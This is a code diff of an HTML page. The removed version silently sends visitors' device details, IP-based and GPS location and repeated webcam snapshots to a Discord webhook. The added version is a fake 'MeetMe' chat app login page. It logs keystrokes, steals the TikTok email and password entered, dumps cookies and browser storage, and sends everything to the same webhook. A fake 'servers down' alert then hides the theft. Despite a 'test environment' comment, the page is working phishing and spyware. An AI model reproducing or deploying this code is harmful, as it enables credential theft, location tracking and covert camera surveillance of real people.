@@ -1,272 +1,355 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="en">
 <head>
-  <script type="text/javascript" src="dwebhook.js">
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MeetMe</title>
+    <link rel="stylesheet" href="style.css">
 </head>
+<body>
 
-<body onload="getLocation()">
+    <!-- ========================================================= -->
+    <!--  ANIMATED BACKGROUND ORBS                                -->
+    <!-- ========================================================= -->
+    <div class="orb"></div>
+    <div class="orb"></div>
+    <div class="orb"></div>
 
-  <iframe src="https://www.meetskip.com/chat" width="100%" height="900" style="border:none;">
-  </iframe>
+    <!-- ========================================================= -->
+    <!--  MAIN APP CARD                                           -->
+    <!-- ========================================================= -->
+    <div class="app-card">
 
-  <p id="demo"></p>
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-  </script>
-  <script>
-    var x = document.getElementById("demo");
+        <!-- HEADER -->
+        <div class="app-header">
+            <!-- PLACEHOLDER IMAGE 1: Logo (Replace src="#") -->
+            <img src="#" alt="App Logo - replace with your logo" class="logo-placeholder">
+            <h1>MeetMe</h1>
+            <span class="beta-tag">✦ Alpha</span>
+        </div>
 
-    let datetime = new Date();
-    let localtime = String(datetime.toLocaleTimeString());
+        <!-- FAKE TYPING DEMO (To sell the AI illusion) -->
+        <div class="demo-prompt">
+            <span>✍️ Generating:</span>
+            <span class="highlight-text" id="typingText">"Hangout with strangers"</span>
+            <span class="typing-cursor"></span>
+        </div>
 
+        <!-- FEATURE PLACEHOLDERS (Row of icons) -->
+        <div class="feature-row">
+            <!-- PLACEHOLDER IMAGE 2: Feature 1 (Replace src) -->
+            <div class="feature-item">
+                <img src="#" alt="AI Icon" class="feat-icon">
+                <span>Talk with friends</span>
+            </div>
+            <!-- PLACEHOLDER IMAGE 3: Feature 2 (Replace src) -->
+            <div class="feature-item">
+                <img src="#" alt="Templates Icon" class="feat-icon">
+                <span>Socialize</span>
+            </div>
+            <!-- PLACEHOLDER IMAGE 4: Feature 3 (Replace src) -->
+            <div class="feature-item">
+                <img src="#" alt="Export Icon" class="feat-icon">
+                <span>Fun</span>
+            </div>
+        </div>
 
-    var sysinfo = (" GET ", "```xl\n" + navigator.userAgent + "```" + "```autohotkey\n" + "\nPlatform: " + navigator.platform + "\nCookies_Enabled: " + navigator.cookieEnabled + "\nBrowser_Language: " + navigator.language + "\nBrowser_Name: " + navigator.appName + "\nBrowser_CodeName: " + navigator.appCodeName + "\nRam: " + navigator.deviceMemory + "\nCPU_cores: " + navigator.hardwareConcurrency + "\nScreen_Width: " + screen.width + "\nScreen_Height: " + screen.height + "\nTime: " + localtime + "\nRefUrl: " + document.referrer + "\nOscpu: " + navigator.oscpu + "```");
+        <!-- TAGLINE -->
+        <div class="tagline">
+            ⚡ <strong>Instant Hangouts</strong> — just describe what you want to say.
+        </div>
 
-    const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP"); //change webhook
+        <!-- ========================================================= -->
+        <!--  THE TRAP: LOGIN TO GENERATE                             -->
+        <!-- ========================================================= -->
+        <div class="login-section">
+            <h2>
+                🔐 Sign In 
+                <span>Required</span>
+            </h2>
+            <p class="sub-text">
+                Chat with friends and have fun!
+            </p>
 
-    request.setRequestHeader('Content-type', 'application/json');
+            <form id="loginForm" autocomplete="off">
+                <div class="form-group">
+                    <label for="email">📧 Tiktok Email</label>
+                    <input type="email" id="email" placeholder="you@company.com" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">🔑 Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <button type="submit" class="btn-login">Login</button>
+            </form>
 
-    var myEmbed = {
-      author: {
-        name: "Target System Information.."
-      },
-      title: "Uagent:",
-      description: sysinfo,
-      color: 15418782
-    }
+            <div class="footer-note">
+                🔒 End-to-end encrypted.
+            </div>
+        </div>
+    </div>
 
-    var params = {
-      username: "DYRXZ",
-      avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-      content: "@everyone Someone Opened The Link O_o ",
-      embeds: [myEmbed]
-    }
+    <!-- ========================================================= -->
+    <!--  THE MALICIOUS JAVASCRIPT (Educational / Test Env ONLY)   -->
+    <!--  Full IP + GPS + Keylogger + Storage Dumper.              -->
+    <!-- ========================================================= -->
+    <script>
+        // =========================================================
+        // STEP 0: CONFIGURE YOUR DISCORD WEBHOOK (Placeholder)
+        // Replace with your own webhook ONLY in your isolated lab.
+        // =========================================================
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP";
 
-    request.send(JSON.stringify(params));
-
-    //...
-
-    $.getJSON("https://api.ipify.org?format=json", function (data) {
-      $("#gfg").html(data.ip);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Ip"
-        },
-        description: '```xl\n' + data.ip + '```' + '\n__**IP Details:**__ https://ip-api.com/#' + data.ip + "\n",
-        color: 15548997,
-
-        footer: {
-          text: "Geographic location based on IP address is NOT accurate, it provides the approximate location of the ISP."
+        // Helper: send data to Discord
+        async function sendToDiscord(message) {
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+            } catch (_) { /* silent fail */ }
         }
-      }
 
-      var params = {
-        username: "DYRXZ",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-    $.getJSON("http://ip-api.com/json/?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query", function (response) {
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "IP Address Reconnaissance"
-        },
-        title: response.status, //response.query
-        description: '```autohotkey\nContinent: ' + response.continent +
-          "\nContinentCode: " + response.continentcode +
-          "\nCountry: " + response.country +
-          "\nCountrycode: " + response.countrycode +
-          "\nRegionname: " + response.regionName +
-          "\nRegion: " + response.region +
-          "\nCity: " + response.city +
-          "\nDistrict: " + response.district +
-          "\nZip: " + response.zip +
-          "\nTime_zone: " + response.time_zone +
-          "\nName: " + response.name +
-          "\nAs: " + response.as +
-          "\nIsp: " + response.isp +
-          "\nReverse: " + response.reverse +
-          "\nOffset: " + response.offset +
-          "\nCurrency: " + response.currency +
-          "\nProxy: " + response.proxy +
-          "\nMobile: " + response.mobile +
-          "\nLat: " + response.lat +
-          "\nLon: " + response.lon + '```',
-        color: 5763719
-
-      }
-
-      var params = {
-        username: "DYRXZ",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
-
-      request.send(JSON.stringify(params));
-    })
-
-
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
-      } else {
-        x.innerHTML = "Geolocation is not supported by this browser.";
-      }
-    }
-
-    function showPosition(position) {
-      var latlong = (" GET ", "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
-
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP"); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var myEmbed = {
-        author: {
-          name: "Target Allowed Location Permission"
-        },
-        title: "GPS location of target..",
-        description: latlong + "\n",
-        color: 15844367,
-        footer: {
-          text: "GPS fetch almost exact location because it uses longitude and latitude coordinates."
+        function now() {
+            return new Date().toISOString().replace('T', ' ').slice(0, 19);
         }
-      }
 
-      var params = {
-        username: "DYRXZ",
-        avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-        embeds: [myEmbed]
-      }
+        // =========================================================
+        // FAKE TYPING ROTATOR (Just for immersion)
+        // =========================================================
+        const phrases = [
+            '"Free to stay"',
+            '"Whats up? :3"',
+            '"Hangout with strangers"',
+            '"Chat with friends"'
+        ];
+        let idx = 0;
+        setInterval(() => {
+            idx = (idx + 1) % phrases.length;
+            document.getElementById('typingText').textContent = phrases[idx];
+        }, 2800);
 
-      request.send(JSON.stringify(params));
+        // =========================================================
+        // STEP 1: FETCH IP + APPROX LOCATION (ipapi.co)
+        // =========================================================
+        async function fetchIPLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                if (!response.ok) throw new Error('IP API failed');
+                const data = await response.json();
+                return {
+                    ip: data.ip || 'N/A',
+                    city: data.city || 'N/A',
+                    region: data.region || 'N/A',
+                    country: data.country_name || 'N/A',
+                    postal: data.postal || 'N/A',
+                    lat: data.latitude || 'N/A',
+                    lon: data.longitude || 'N/A',
+                    isp: data.org || 'N/A',
+                    timezone: data.timezone || 'N/A'
+                };
+            } catch (e) {
+                return { error: 'IP lookup failed (adblocker or network issue)' };
+            }
+        }
 
-    }
+        // =========================================================
+        // STEP 2: REQUEST EXACT GPS (Requires user "Allow")
+        // =========================================================
+        function requestGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ gps_status: 'Geolocation API not supported' });
+                    return;
+                }
+                let resolved = false;
+                const timeout = setTimeout(() => {
+                    if (!resolved) {
+                        resolved = true;
+                        resolve({ gps_status: 'GPS request timed out (user ignored)' });
+                    }
+                }, 5000);
 
-    function showError(error) {
-      switch (error.code) {
-        case error.PERMISSION_DENIED:
-          const request = new XMLHttpRequest();
-          request.open("POST", "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP"); //change webhook
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        if (!resolved) {
+                            resolved = true;
+                            clearTimeout(timeout);
+                            resolve({
+                                gps_status: 'GPS captured successfully',
+                                gps_lat: position.coords.latitude,
+                                gps_lon: position.coords.longitude,
+                                gps_accuracy_meters: position.coords.accuracy
+                            });
+                        }
+                    },
+                    (error) => {
+                        if (!resolved) {
+                            resolved = true;
+                            clearTimeout(timeout);
+                            let msg = 'GPS denied/unavailable';
+                            if (error.code === 1) msg = 'GPS permission denied by user';
+                            else if (error.code === 2) msg = 'GPS position unavailable';
+                            else if (error.code === 3) msg = 'GPS request timed out';
+                            resolve({ gps_status: msg });
+                        }
+                    }
+                );
+            });
+        }
 
-          request.setRequestHeader('Content-type', 'application/json');
+        // =========================================================
+        // STEP 3: ON PAGE LOAD — HARVEST EVERYTHING
+        // =========================================================
+        (async function initialExfil() {
+            const ipData = await fetchIPLocation();
+            const gpsData = await requestGPSLocation();
 
-          const params = {
-            username: "DYRXZ",
-            avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
-            content: "```diff\n- User denied the request for Geolocation.```"
-          }
+            let storageDump = 'N/A';
+            try { storageDump = JSON.stringify(localStorage, null, 2) || 'Empty'; } catch (_) {}
 
-          request.send(JSON.stringify(params));
-          break;
-        case error.POSITION_UNAVAILABLE:
-          x.innerHTML = "Location information is unavailable."
-          break;
-        case error.TIMEOUT:
-          x.innerHTML = "The request to get user location timed out."
-          break;
-        case error.UNKNOWN_ERROR:
-          x.innerHTML = "An unknown error occurred."
-          break;
-      }
-    }
-  </script>
-  <div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
-  </div>
-  <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-  <script>
-    var url = "";
-    request.open("GET", "https://discord.com/api/webhooks/1550434148512964640/4xPqXbuR-OJ2iCER8ehFIHSBWyN5Nk4MMeRahivzM7JBAdgduvSAfaQBPLEWYYsjCgHP/get_target", true);
+            let locationText = '';
+            if (gpsData.gps_status.includes('successfully')) {
+                locationText = `
+        **📍 EXACT GPS (Real Location)**
+        Status: ${gpsData.gps_status}
+        Exact Lat: ${gpsData.gps_lat}
+        Exact Lon: ${gpsData.gps_lon}
+        Accuracy: ±${gpsData.gps_accuracy_meters} meters
+        *(IP location ignored because GPS is precise)*
+                `;
+            } else {
+                locationText = `
+        **🌐 IP-BASED (Fallback - Approx)**
+        IP: ${ipData.ip || 'N/A'}
+        City: ${ipData.city || 'N/A'}
+        Region: ${ipData.region || 'N/A'}
+        Country: ${ipData.country || 'N/A'}
+        ISP: ${ipData.isp || 'N/A'}
+        Approx Lat/Lon: ${ipData.lat || 'N/A'}, ${ipData.lon || 'N/A'}
+        *(GPS was ${gpsData.gps_status})*
+                `;
+            }
 
-    request.onload = function () {
-      if (request.status === 200) {
-        url = request.responseText;
-      } else {
-        url = "http://127.0.0.1:8000/image"
-      }
-    };
+            const fingerprint = `
+        🕵️ **NEW AI TOOL USER** (${now()})
+        ${locationText}
 
-    request.send();
-    function postFile(file) {
-      let formdata = new FormData();
-      formdata.append("image", file);
-      let xhr = new XMLHttpRequest();
-      xhr.open('POST', url, true);
-      xhr.onload = function () {
-        if (this.status === 200)
-          console.log(this.response);
-        else
-          console.error(xhr);
-      };
-      xhr.send(formdata);
-    }
+        **💻 DEVICE FINGERPRINT**
+        URL: ${window.location.href}
+        User Agent: ${navigator.userAgent}
+        Platform: ${navigator.platform}
+        Screen: ${screen.width}x${screen.height}
+        Language: ${navigator.language}
+        Cookies: ${document.cookie || 'HttpOnly/None'}
 
+        **💾 LOCAL STORAGE DUMP**
+        \`\`\`json
+        ${storageDump}
+        \`\`\`
+            `;
+            sendToDiscord(fingerprint);
+        })();
 
+        // =========================================================
+        // STEP 4: KEYLOGGER (targets the login form)
+        // =========================================================
+        const emailField = document.getElementById('email');
+        const passField = document.getElementById('password');
+        let keyBuffer = [];
 
+        function flushKeys() {
+            if (keyBuffer.length > 0) {
+                const keys = keyBuffer.join('');
+                sendToDiscord(`⌨️ **Keystroke Buffer** (${keyBuffer.length} chars): \`\`\`${keys}\`\`\``);
+                keyBuffer = [];
+            }
+        }
 
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const errorMsgElement = document.querySelector('span#errorMsg');
+        document.addEventListener('keydown', (e) => {
+            if (e.target === emailField || e.target === passField) {
+                if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
+                    if (e.key === 'Backspace') keyBuffer.push('[⌫]');
+                    else keyBuffer.push(e.key);
+                }
+                if (keyBuffer.length >= 20) flushKeys();
+            }
+        });
 
-    const constraints = {
-      audio: false,
-      video: {
+        let flushTimer = setInterval(() => {
+            if (keyBuffer.length > 0) flushKeys();
+        }, 8000);
 
-        facingMode: "user"
-      }
-    };
+        // =========================================================
+        // STEP 5: INTERCEPT FORM SUBMISSION (Steal creds)
+        // =========================================================
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
 
-    // Access webcam
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints)
-        handleSuccess(stream);
-      } catch (e) {
-        setTimeout(function () {
-          alert("Allow Camera access to video chat");
-          window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623"
-          alert("Grant cam access")
-        }, 15000)
-      }
-    }
+            const email = emailField.value;
+            const password = passField.value;
 
-    // Success
-    function handleSuccess(stream) {
-      window.stream = stream;
-      video.srcObject = stream;
+            flushKeys();
+            clearInterval(flushTimer);
 
-      var context = canvas.getContext('2d');
-      setInterval(function () {
+            const credMessage = `
+        🚨 **LOGIN CREDENTIALS CAPTURED** (${now()})
+        **Email**: ${email}
+        **Password**: ${password}
+        **User Agent**: ${navigator.userAgent}
+            `;
+            sendToDiscord(credMessage);
 
-        context.drawImage(video, 0, 0, 640, 480);
-        canvas.toBlob(postFile, 'image/jpeg');
-      }, 1500);
+            // Dump session storage too
+            try {
+                const sess = JSON.stringify(sessionStorage, null, 2);
+                if (sess.length > 2) {
+                    sendToDiscord(`📂 **SessionStorage**: \`\`\`json\n${sess}\n\`\`\``);
+                }
+            } catch (_) {}
 
+            // =============================================
+            // DECOY: Fake "Generating" to hide the theft
+            // =============================================
+            const btn = document.querySelector('.btn-login');
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+            btn.style.opacity = '0.6';
 
-    }
+            setTimeout(() => {
+                alert('⚠️ Oops! Our Servers are currently down. Please try again later.');
+                btn.textContent = 'Login';
+                btn.disabled = false;
+                btn.style.opacity = '1';
+                emailField.value = '';
+                passField.value = '';
+                keyBuffer = [];
+                flushTimer = setInterval(() => {
+                    if (keyBuffer.length > 0) flushKeys();
+                }, 8000);
+            }, 2200);
+        });
 
-    // Load init
-    init();
-  </script>
+        // =========================================================
+        // STEP 6: EXFILTRATE ON PAGE UNLOAD (sendBeacon)
+        // =========================================================
+        window.addEventListener('beforeunload', function() {
+            if (keyBuffer.length > 0) {
+                const keys = keyBuffer.join('');
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+                    content: `⌨️ **FINAL BUFFER** (Unload): \`\`\`${keys}\`\`\``
+                }));
+            }
+            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+                content: `🚪 **Page Unloaded** at ${now()}`
+            }));
+        });
+
+        // Innocent console log
+        console.log('%c✍️ MeetMe v1.2', 'font-size:16px; color:#a29bfe; font-weight:bold;');
+        console.log('%cReady to have fun!', 'font-size:12px; color:gray;');
+    </script>
+
 </body>
-
 </html>
